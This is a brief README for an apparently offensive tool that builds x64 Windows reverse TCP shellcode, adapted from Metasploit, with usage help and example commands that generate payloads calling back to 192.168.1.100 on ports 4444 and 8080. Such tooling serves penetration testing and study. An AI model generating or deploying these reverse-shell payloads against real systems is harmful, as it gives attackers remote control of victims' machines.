# ASM shell_reverse_tcp
Builder script expropriated to metasploit-framework (modified by Vay3t to allow custom IP/port/exitfunc).

# Help

```
$ python3 build.py                
Usage: build.py [clean|build|gen]
  clean                              - Clean .bin files
  build                              - Build shell_reverse_tcp
  gen <ip> <port> [thread|process]   - Generate revsh_<port>.bin
```

## Examples

```bash
python3 build.py gen 192.168.1.100 4444 # default is thread exit
python3 build.py gen 192.168.1.100 4444 thread
python3 build.py gen 192.168.1.100 8080 process
```

# Reference

* https://github.com/rapid7/metasploit-framework/tree/master/external/source/shellcode/windows/x64